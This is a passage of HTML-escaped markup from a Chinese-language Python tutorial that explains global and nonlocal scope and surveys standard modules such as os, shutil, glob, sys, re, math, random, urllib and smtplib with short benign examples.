&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数外是全局变量 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; total&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
函数内是局部变量 :  30
函数外是全局变量 :  0
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;global-和-nonlocal关键字&#34;&gt;&lt;a href=&#34;#global-和-nonlocal关键字&#34; class=&#34;headerlink&#34; title=&#34;global 和 nonlocal关键字&#34;&gt;&lt;/a&gt;global 和 nonlocal关键字&lt;/h3&gt;&lt;p&gt;当内部作用域想修改外部作用域的变量时，用到 global 和 nonlocal 关键字&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 修改全局变量 num&lt;/span&gt;

num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fun1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; num  &lt;span class=&#34;token comment&#34;&gt;# 需要使用 global 关键字声明&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
    num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
fun1&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1
123
123
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nonlocal 修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;outer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;inner&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;nonlocal&lt;/span&gt; num   &lt;span class=&#34;token comment&#34;&gt;# nonlocal关键字声明&lt;/span&gt;
        num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    inner&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
outer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
100
100
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;标准库概览&#34;&gt;&lt;a href=&#34;#标准库概览&#34; class=&#34;headerlink&#34; title=&#34;标准库概览&#34;&gt;&lt;/a&gt;标准库概览&lt;/h2&gt;&lt;h3 id=&#34;操作系统接口&#34;&gt;&lt;a href=&#34;#操作系统接口&#34; class=&#34;headerlink&#34; title=&#34;操作系统接口&#34;&gt;&lt;/a&gt;操作系统接口&lt;/h3&gt;&lt;p&gt;os模块提供了不少与操作系统相关联的函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getcwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 返回当前的工作目录&lt;/span&gt;
os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;chdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/server/accesslogs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 修改当前的工作目录&lt;/span&gt;
os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;mkdir today&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 执行系统命令 mkdir&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# returns a list of all module functions&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 帮助文档&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;针对日常的文件和目录管理任务，:mod:shutil 模块提供了一个易于使用的高级接口&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; shutil
shutil&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;copyfile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data.db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;archive.db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
shutil&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;move&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/build/executables&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;installdir&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;文件通配符&#34;&gt;&lt;a href=&#34;#文件通配符&#34; class=&#34;headerlink&#34; title=&#34;文件通配符&#34;&gt;&lt;/a&gt;文件通配符&lt;/h3&gt;&lt;p&gt;glob模块提供了一个函数用于从目录通配符搜索中生成文件列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; glob
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;glob&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;glob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;*.py&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;xxx.py&#39;, &#39;xxx.py&#39;, &#39;xxx.py&#39;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;命令行参数&#34;&gt;&lt;a href=&#34;#命令行参数&#34; class=&#34;headerlink&#34; title=&#34;命令行参数&#34;&gt;&lt;/a&gt;命令行参数&lt;/h3&gt;&lt;p&gt;通用工具脚本经常调用命令行参数。这些命令行参数以链表形式存储于 sys 模块的 argv 变量。例如在命令行中执行 “python demo.py one two three” 后可以得到以下输出结果:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;错误输出重定向和程序终止&#34;&gt;&lt;a href=&#34;#错误输出重定向和程序终止&#34; class=&#34;headerlink&#34; title=&#34;错误输出重定向和程序终止&#34;&gt;&lt;/a&gt;错误输出重定向和程序终止&lt;/h3&gt;&lt;p&gt;sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Warning, log file not found starting a new one\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;大多脚本的定向终止都使用 sys.exit()&lt;/p&gt;
&lt;h3 id=&#34;字符串正则匹配&#34;&gt;&lt;a href=&#34;#字符串正则匹配&#34; class=&#34;headerlink&#34; title=&#34;字符串正则匹配&#34;&gt;&lt;/a&gt;字符串正则匹配&lt;/h3&gt;&lt;p&gt;re模块为高级字符串处理提供了正则表达式工具&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; re
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;findall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#39;\bf[a-z]*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;which foot or hand fell fastest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;foot&#39;, &#39;fell&#39;, &#39;fastest&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sub&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#39;(\b[a-z]+) \1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;r&#39;\1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;cat in the the hat&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#39;cat in the hat&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数学&#34;&gt;&lt;a href=&#34;#数学&#34; class=&#34;headerlink&#34; title=&#34;数学&#34;&gt;&lt;/a&gt;数学&lt;/h3&gt;&lt;p&gt;math模块为浮点运算提供了对底层C函数库的访问&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; math
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cos&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.70710678118654757&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 10.0&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;random提供了生成随机数的工具&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;choice&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pear&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;banana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#39;apple&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sample&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# sampling without replacement&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [30, 83, 16, 4, 8, 81, 41, 50, 18, 33]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# random float&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.17970987693706186&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randrange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# random integer chosen from range(6)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;访问互联网&#34;&gt;&lt;a href=&#34;#访问互联网&#34; class=&#34;headerlink&#34; title=&#34;访问互联网&#34;&gt;&lt;/a&gt;访问互联网&lt;/h3&gt;&lt;p&gt;有几个模块用于访问互联网以及处理网络通信协议，处理从 urls 接收的数据的 urllib.request 以及用于发送电子邮件的 smtplib&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; urlopen

&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; urlopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://tycho.usno.navy.mil/cgi-bin/timer.pl&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    line &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# Decoding the binary data to text.&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;EST&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;EDT&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# look for Eastern Time&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# &amp;lt;BR&amp;gt;Nov. 25, 09:43:32 PM EST&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; smtplib

server &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; smtplib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SMTP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
server&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendmail&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;soothsayer@example.org&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;jcaesar@example.org&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;To: jcaesar@example.org
From: soothsayer@example.org

Beware the Ides of March.
&#34;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
server&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;quit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

